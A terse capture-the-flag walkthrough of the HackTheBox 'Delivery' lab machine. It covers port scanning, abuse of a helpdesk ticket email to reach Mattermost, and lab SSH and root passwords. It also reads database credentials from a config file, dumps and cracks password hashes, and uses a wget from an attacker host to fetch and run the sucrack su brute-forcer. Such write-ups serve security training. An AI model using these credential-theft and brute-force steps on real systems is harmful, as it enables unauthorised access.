----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# Delivery
# 27/3/2023
10.10.10.222

----------------------------------------------------
# nmap
----------------------------------------------------
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    nginx 1.14.2
8065/tcp open  unknown

----------------------------------------------------
# enum/exploitation
----------------------------------------------------
└─$ sudo nano /etc/hosts            
10.10.10.222 delivery.htb helpdesk.delivery.htb
http://helpdesk.delivery.htb/


open a tickit
after that
You may check the status of your ticket, by navigating to the Check Status page using ticket id: 4844622.
If you want to add more information to your ticket, just email 4844622@delivery.htb.
http://10.10.10.222:8065/login
http://10.10.10.222:8065/signup_email nnow create mail with
4844622@delivery.htb
login to mattermost
we got ssh creds
maildeliverer:Youve_G0t_Mail! 

----------------------------------------------------
# privesc
----------------------------------------------------
cat /opt/mattermost/config/config.json
mysql -u mmuser -p
use mattermost;
select * from Users;
echo PleaseSubscribe! | hashcat -r /usr/share/hashcat/rules/best64.rule --stdout
brutforce with that wordlist for root
john root_hash --wordlist=wordlist

        method 2

git clone https://github.com/hemp3l/sucrack
rm -rf sucrack/.git/
zip sucrack.zip -r sucrack/
wget 10.10.14.4/sucrack.zip
unzip sucrack.zip
cd /dev/shm/sucrack/
./configure
make
/dev/shm/sucrack/src/sucrack -a -w 20 -s 10 -u root -rl AFLafld /dev/shm/wordlist

root:PleaseSubscribe!21